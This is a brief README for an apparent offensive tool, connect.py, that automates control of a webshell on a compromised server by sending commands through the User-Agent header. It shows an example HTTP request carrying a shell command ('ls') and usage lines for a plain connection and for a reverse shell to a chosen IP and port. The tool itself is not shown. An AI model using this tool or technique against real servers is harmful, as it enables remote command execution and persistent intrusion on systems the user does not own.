This tool was created for automate process of make connections to  webshell by header

for example, when there is a page webshell.php and the Header <b>User-Agent</b> is accepting 
code execution in the server 

and you can execute commands as in the example:

```HTTP
GET /webshell.php HTTP/1.1
User-Agent: ls 
Host: example.com 
Accept-Language: en-us 
Accept-Encoding: gzip, deflate 
Connection: Keep-Alive 
```



# How to use

<b>default connection:</b>

```bash
python3 connect.py [webpage] [Argument]
```

<b>Reverse Shell connection:</b>

```bash
python3 connect.py [webpage] [Argument] [reverse_shell_ip] [reverse_shell_port]
```
